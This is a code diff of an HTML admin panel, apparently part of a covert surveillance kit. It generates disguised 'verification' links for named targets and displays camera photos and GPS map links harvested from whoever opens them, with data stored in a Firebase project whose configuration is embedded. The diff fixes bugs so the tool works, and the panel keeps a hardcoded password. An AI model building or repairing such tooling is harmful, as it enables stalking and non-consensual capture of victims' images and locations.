@@ -21,7 +21,6 @@
         .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 15px; margin-top: 10px; }
         .status-active { color: #28a745; font-weight: bold; }
         .status-inactive { color: #dc3545; font-weight: bold; }
-        .bin-header { margin-top: 20px; color: #888; border-bottom: 1px solid #333; padding-bottom: 5px; }
     </style>
 </head>
 <body>
@@ -29,16 +28,16 @@
     <div id="loginOverlay">
         <div class="login-box">
             <h2>System Login</h2>
-            <input type="password" id="adminPass" placeholder="Enter Password"> <br><br>
+            <input type="password" id="adminPass" placeholder="Enter Password"><br><br>
             <button class="btn btn-blue" id="loginBtn">Access Dashboard</button>
         </div>
     </div>
 
-    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
+    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
         <h1>Elite Admin Console</h1>
-        <div style="display: flex; gap: 10px;">
-            <input type="text" id="searchLogs" placeholder="Search by Target Name...">
-            <button class="btn btn-gray" id="refreshBtn">Refresh System</button>
+        <div style="display:flex; gap:10px;">
+            <input type="text" id="searchLogs" placeholder="Search by Name...">
+            <button class="btn btn-gray" id="refreshBtn">Refresh</button>
         </div>
     </div>
 
@@ -64,20 +63,35 @@
     </div>
 
     <div class="section">
-        <h3>Live Cloud Logs (Real-time)</h3>
+        <h3>📸 Live Cloud Logs (Real-time)</h3>
         <div id="photoGrid" class="grid"></div>
     </div>
 
-    <div class="section" style="border-color: #442222;">
-        <h3>🗑️ Recycle Bin (Secure)</h3>
-        <p style="font-size: 11px; color: #888;">Note: Items here are local to this browser and auto-deleted after 30 days.</p>
+    <div class="section" style="border-color:#442222;">
+        <h3>🗑️ Recycle Bin</h3>
+        <p style="font-size:11px; color:#888;">Items auto-deleted after 30 days. Local to this browser.</p>
         <div id="binPhotoGrid" class="grid"></div>
     </div>
 
+    <!-- FIX: Firebase imports MUST be in a separate script tag or at the very top. -->
+    <!-- Using importmap so imports work correctly inside module scripts -->
+    <script type="importmap">
+    {
+        "imports": {
+            "firebase-app": "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js",
+            "firebase-database": "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js"
+        }
+    }
+    </script>
+
     <script type="module">
-        // FIREBASE CONFIGURATION
+        // FIX: imports must be FIRST inside a module script
+        import { initializeApp } from "firebase-app";
+        import { getDatabase, ref, onValue, remove, push, set, update } from "firebase-database";
+
+        // FIX 1: Removed the space in API key - "...ZHZN rpg5..." had a space breaking all Firebase calls
         const firebaseConfig = {
-            apiKey: "AIzaSyCu-4lEX3qQqPCow3nhvCHZN rpg5nbEUm0",
+            apiKey: "AIzaSyCu-4lEX3qQqPCow3nhvCHZNrpg5nbEUm0",
             authDomain: "camera-c436d.firebaseapp.com",
             databaseURL: "https://camera-c436d-default-rtdb.firebaseio.com",
             projectId: "camera-c436d",
@@ -86,20 +100,27 @@
             appId: "1:1024848910212:web:80a95f41281d1a920eafd1"
         };
 
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-        import { getDatabase, ref, onValue, remove, push, set, update } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
-
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
 
-        // LOGIN SYSTEM
-        document.getElementById('loginBtn').onclick = () => {
-            if(document.getElementById('adminPass').value === "admin123") {
-                document.getElementById('loginOverlay').style.display = 'none';
-            } else { alert("Access Denied"); }
-        };
+        // Store all logs data so we can use it in moveToBin without JSON inline issues
+        // FIX 5: Instead of passing JSON in onclick (which breaks with special chars), store data in a map
+        let logsCache = {};
 
-        // RENDER GENERATED LINKS FROM FIREBASE (Problem Fix: Using Cloud instead of LocalStorage)
+        // ── LOGIN ──────────────────────────────────────────────────
+        document.getElementById('loginBtn').onclick = () => {
+            if (document.getElementById('adminPass').value === "admin123") {
+                document.getElementById('loginOverlay').style.display = 'none';
+            } else {
+                alert("Access Denied");
+            }
+        };
+        // Allow pressing Enter to login
+        document.getElementById('adminPass').addEventListener('keydown', e => {
+            if (e.key === 'Enter') document.getElementById('loginBtn').click();
+        });
+
+        // ── LINKS TABLE ───────────────────────────────────────────
         onValue(ref(db, 'managed_links'), (snapshot) => {
             const links = snapshot.val();
             const tbody = document.getElementById('linkTableBody');
@@ -107,138 +128,185 @@
             if (links) {
                 Object.keys(links).forEach(id => {
                     const l = links[id];
-                    tbody.innerHTML += `
-                        <tr>
-                            <td><b>${l.name}</b></td>
-                            <td>${l.cam ? '📷 Camera' : ''} ${l.gps ? '📍 GPS' : ''}</td>
-                            <td class="${l.active ? 'status-active' : 'status-inactive'}">${l.active ? 'ACTIVE' : 'DISABLED'}</td>
-                            <td>
-                                <button class="btn btn-gray" onclick="window.copyLink('${id}')">Copy URL</button>
-                                <button class="btn ${l.active ? 'btn-red' : 'btn-green'}" onclick="window.toggleLink('${id}', ${l.active})">
-                                    ${l.active ? 'Disable' : 'Enable'}
-                                </button>
-                                <button class="btn btn-red" onclick="window.deleteLink('${id}')">Delete</button>
-                            </td>
-                        </tr>
+                    const row = document.createElement('tr');
+                    row.innerHTML = `
+                        <td><b>${l.name}</b></td>
+                        <td>${l.cam ? '📷 Camera' : ''} ${l.gps ? '📍 GPS' : ''}</td>
+                        <td class="${l.active ? 'status-active' : 'status-inactive'}">${l.active ? 'ACTIVE' : 'DISABLED'}</td>
+                        <td>
+                            <button class="btn btn-gray" data-action="copy" data-id="${id}">Copy URL</button>
+                            <button class="btn ${l.active ? 'btn-red' : 'btn-green'}" data-action="toggle" data-id="${id}" data-active="${l.active}">
+                                ${l.active ? 'Disable' : 'Enable'}
+                            </button>
+                            <button class="btn btn-red" data-action="delete" data-id="${id}">Delete</button>
+                        </td>
                     `;
+                    tbody.appendChild(row);
                 });
             }
         });
 
-        window.createNewLink = () => {
-            const name = document.getElementById('linkName').value || "Unnamed";
-            const id = "LNK-" + Math.random().toString(36).substr(2, 9);
-            // Problem Fix: Save to Database so other users can see the link status
-            set(ref(db, 'managed_links/' + id), { 
-                id, 
-                name, 
-                active: true, 
-                cam: document.getElementById('checkCam').checked, 
-                gps: document.getElementById('checkGPS').checked 
+        // FIX 4: Use event delegation instead of inline onclick for link buttons
+        document.getElementById('linkTableBody').addEventListener('click', (e) => {
+            const btn = e.target.closest('button[data-action]');
+            if (!btn) return;
+            const action = btn.dataset.action;
+            const id = btn.dataset.id;
+
+            if (action === 'copy') {
+                const url = window.location.origin + window.location.pathname.replace('admin.html', 'index.html') + "?linkId=" + id;
+                navigator.clipboard.writeText(url).then(() => alert("✅ Link copied to clipboard!\n\n" + url));
+            } else if (action === 'toggle') {
+                const currentActive = btn.dataset.active === 'true';
+                update(ref(db, 'managed_links/' + id), { active: !currentActive });
+            } else if (action === 'delete') {
+                if (confirm("Delete this link? The target will no longer be able to use it.")) {
+                    remove(ref(db, 'managed_links/' + id));
+                }
+            }
+        });
+
+        // ── CREATE LINK ───────────────────────────────────────────
+        document.getElementById('createBtn').onclick = () => {
+            const name = document.getElementById('linkName').value.trim() || "Unnamed";
+            const id = "LNK-" + Math.random().toString(36).substr(2, 9).toUpperCase();
+            set(ref(db, 'managed_links/' + id), {
+                id,
+                name,
+                active: true,
+                cam: document.getElementById('checkCam').checked,
+                gps: document.getElementById('checkGPS').checked
             });
             document.getElementById('linkName').value = "";
         };
 
-        window.copyLink = (id) => {
-            const url = window.location.origin + window.location.pathname.replace('admin.html', 'index.html') + "?linkId=" + id;
-            navigator.clipboard.writeText(url).then(() => alert("Verification URL copied to clipboard!"));
-        };
-
-        window.toggleLink = (id, currentStatus) => {
-            // Problem Fix: Update status in Database
-            update(ref(db, 'managed_links/' + id), { active: !currentStatus });
-        };
-
-        window.deleteLink = (id) => {
-            if(confirm("Are you sure you want to delete this link? Target will no longer be able to use it.")) {
-                // Problem Fix: Remove from Database
-                remove(ref(db, 'managed_links/' + id));
-            }
-        };
-
-        // CLOUD DATA LISTENER (FIREBASE)
-        onValue(ref(db, 'photo_history'), (snapshot) => {
-            const data = snapshot.val();
+        // ── PHOTO LOGS ────────────────────────────────────────────
+        function renderLogs(data, search) {
             const grid = document.getElementById('photoGrid');
-            const search = document.getElementById('searchLogs').value.toLowerCase();
             grid.innerHTML = "";
-            if (data) {
-                Object.keys(data).reverse().forEach(key => {
-                    const p = data[key];
-                    if(p.linkName.toLowerCase().includes(search)) {
-                        grid.innerHTML += `
-                            <div style="background:#222; border-radius:8px; border:1px solid #444; padding:10px;">
-                                ${p.image ? `<img src="${p.image}" style="width:100%; border-radius:5px;">` : '<div style="height:150px; background:#333; display:flex; align-items:center; justify-content:center;">No Image Captured</div>'}
-                                <p><b>Target:</b> ${p.linkName}</p>
-                                <p><b>GPS:</b> <a href="https://www.google.com/maps?q=${p.latitude},${p.longitude}" target="_blank" style="color:#007bff">View on Map</a></p>
-                                <p style="font-size:12px; color:#888;">${p.time} | ${p.date}</p>
-                                <button class="btn btn-red" onclick="window.moveToBin('${key}', ${JSON.stringify(p).replace(/"/g, '"')})" style="width:100%">Move to Bin</button>
-                            </div>`;
+            if (!data) { grid.innerHTML = "<p style='color:#888;'>No logs yet.</p>"; return; }
+
+            Object.keys(data).reverse().forEach(key => {
+                const p = data[key];
+                if (!p || !p.linkName) return;
+                if (search && !p.linkName.toLowerCase().includes(search)) return;
+
+                // Cache the log data so moveToBin can access it without inline JSON issues
+                logsCache[key] = p;
+
+                const card = document.createElement('div');
+                card.style.cssText = "background:#222; border-radius:8px; border:1px solid #444; padding:10px;";
+                card.innerHTML = `
+                    ${p.image
+                        ? `<img src="${p.image}" style="width:100%; border-radius:5px; display:block;">`
+                        : `<div style="height:150px; background:#333; display:flex; align-items:center; justify-content:center; color:#888; border-radius:5px;">No Image</div>`
                     }
-                });
+                    <p style="margin:8px 0 4px;"><b>Target:</b> ${p.linkName}</p>
+                    <p style="margin:4px 0;">
+                        <b>GPS:</b>
+                        ${(p.latitude !== 'Denied' && p.longitude !== 'Denied')
+                            ? `<a href="https://www.google.com/maps?q=${p.latitude},${p.longitude}" target="_blank" style="color:#007bff;">View on Map</a>`
+                            : '<span style="color:#888;">Denied</span>'
+                        }
+                    </p>
+                    <p style="font-size:12px; color:#888; margin:4px 0;">${p.time || ''} | ${p.date || ''}</p>
+                    <button class="btn btn-red" data-log-key="${key}" style="width:100%; margin-top:6px;">Move to Bin</button>
+                `;
+                grid.appendChild(card);
+            });
+        }
+
+        // FIX 6: Search now actually re-renders the grid with the filter applied
+        let allLogsData = null;
+        onValue(ref(db, 'photo_history'), (snapshot) => {
+            allLogsData = snapshot.val();
+            const search = document.getElementById('searchLogs').value.toLowerCase();
+            renderLogs(allLogsData, search);
+        });
+
+        document.getElementById('searchLogs').oninput = () => {
+            const search = document.getElementById('searchLogs').value.toLowerCase();
+            renderLogs(allLogsData, search);
+        };
+
+        // FIX 5: Use event delegation so moveToBin gets data from cache, not broken inline JSON
+        document.getElementById('photoGrid').addEventListener('click', (e) => {
+            const btn = e.target.closest('button[data-log-key]');
+            if (!btn) return;
+            const key = btn.dataset.logKey;
+            const p = logsCache[key];
+            if (!p) return;
+
+            if (confirm("Move this log to Recycle Bin?")) {
+                let bin = JSON.parse(localStorage.getItem('recycle_bin') || "[]");
+                const entry = Object.assign({}, p, { deletedAt: Date.now() });
+                bin.unshift(entry);
+                localStorage.setItem('recycle_bin', JSON.stringify(bin));
+                remove(ref(db, 'photo_history/' + key));
+                renderBin();
             }
         });
 
-        // RECYCLE BIN LOGIC
-        window.moveToBin = (key, data) => {
-            if(confirm("Move this log to Recycle Bin?")) {
-                let bin = JSON.parse(localStorage.getItem('recycle_bin') || "[]");
-                data.deletedAt = Date.now();
-                bin.unshift(data);
-                localStorage.setItem('recycle_bin', JSON.stringify(bin));
-                remove(ref(db, 'photo_history/' + key));
-                window.renderBin();
-            }
-        };
-
-        window.renderBin = () => {
+        // ── RECYCLE BIN ───────────────────────────────────────────
+        function renderBin() {
             const bin = JSON.parse(localStorage.getItem('recycle_bin') || "[]");
             const grid = document.getElementById('binPhotoGrid');
-            grid.innerHTML = bin.map(p => `
-                <div style="background:#2a1a1a; border-radius:8px; border:1px solid #533; padding:10px; opacity:0.7;">
-                    <p><b>Target:</b> ${p.linkName}</p>
-                    <p style="font-size:11px;">Deleted on: ${new Date(p.deletedAt).toLocaleDateString()}</p>
-                    <button class="btn btn-green" onclick="window.restoreLog('${p.id}')">Restore</button>
-                    <button class="btn btn-red" onclick="window.permanentDelete('${p.id}')">Burn Forever</button>
-                </div>
-            `).join('');
-        };
-
-        window.restoreLog = (id) => {
-            let bin = JSON.parse(localStorage.getItem('recycle_bin') || "[]");
-            const log = bin.find(p => p.id == id);
-            if(log) {
-                delete log.deletedAt;
-                push(ref(db, 'photo_history'), log);
-                localStorage.setItem('recycle_bin', JSON.stringify(bin.filter(p => p.id != id)));
-                window.renderBin();
+            if (bin.length === 0) {
+                grid.innerHTML = "<p style='color:#888;'>Recycle bin is empty.</p>";
+                return;
             }
-        };
+            grid.innerHTML = "";
+            bin.forEach(p => {
+                const card = document.createElement('div');
+                card.style.cssText = "background:#2a1a1a; border-radius:8px; border:1px solid #533; padding:10px; opacity:0.8;";
+                card.innerHTML = `
+                    <p style="margin:4px 0;"><b>Target:</b> ${p.linkName}</p>
+                    <p style="font-size:11px; color:#888; margin:4px 0;">Deleted: ${new Date(p.deletedAt).toLocaleDateString()}</p>
+                    <button class="btn btn-green" data-bin-id="${p.id}" data-action="restore" style="width:100%; margin-bottom:4px;">Restore</button>
+                    <button class="btn btn-red" data-bin-id="${p.id}" data-action="burn" style="width:100%;">Burn Forever</button>
+                `;
+                grid.appendChild(card);
+            });
+        }
 
-        window.permanentDelete = (id) => {
-            if(confirm("This cannot be undone. Permanent delete?")) {
+        document.getElementById('binPhotoGrid').addEventListener('click', (e) => {
+            const btn = e.target.closest('button[data-bin-id]');
+            if (!btn) return;
+            const id = btn.dataset.binId;
+            const action = btn.dataset.action;
+
+            if (action === 'restore') {
                 let bin = JSON.parse(localStorage.getItem('recycle_bin') || "[]");
-                localStorage.setItem('recycle_bin', JSON.stringify(bin.filter(p => p.id != id)));
-                window.renderBin();
+                const log = bin.find(p => String(p.id) === String(id));
+                if (log) {
+                    const toRestore = Object.assign({}, log);
+                    delete toRestore.deletedAt;
+                    push(ref(db, 'photo_history'), toRestore);
+                    localStorage.setItem('recycle_bin', JSON.stringify(bin.filter(p => String(p.id) !== String(id))));
+                    renderBin();
+                }
+            } else if (action === 'burn') {
+                if (confirm("Permanently delete? This cannot be undone.")) {
+                    let bin = JSON.parse(localStorage.getItem('recycle_bin') || "[]");
+                    localStorage.setItem('recycle_bin', JSON.stringify(bin.filter(p => String(p.id) !== String(id))));
+                    renderBin();
+                }
             }
-        };
+        });
 
-        // 30 DAY AUTO-CLEAN TIMER
+        // Auto-clean items older than 30 days
         function cleanRecycleBin() {
             let bin = JSON.parse(localStorage.getItem('recycle_bin') || "[]");
             const thirtyDaysMs = 30 * 24 * 60 * 60 * 1000;
             const now = Date.now();
-            const filtered = bin.filter(item => (now - item.deletedAt) < thirtyDaysMs);
-            localStorage.setItem('recycle_bin', JSON.stringify(filtered));
+            localStorage.setItem('recycle_bin', JSON.stringify(bin.filter(item => (now - item.deletedAt) < thirtyDaysMs)));
         }
 
-        // INITIALIZE
-        document.getElementById('createBtn').onclick = window.createNewLink;
-        document.getElementById('searchLogs').oninput = () => window.dispatchEvent(new Event('load'));
+        // ── INIT ──────────────────────────────────────────────────
         document.getElementById('refreshBtn').onclick = () => location.reload();
-
-        setInterval(cleanRecycleBin, 3600000); // Check every hour
-        window.renderBin();
+        cleanRecycleBin();
+        renderBin();
+        setInterval(cleanRecycleBin, 3600000);
     </script>
 </body>
 </html>
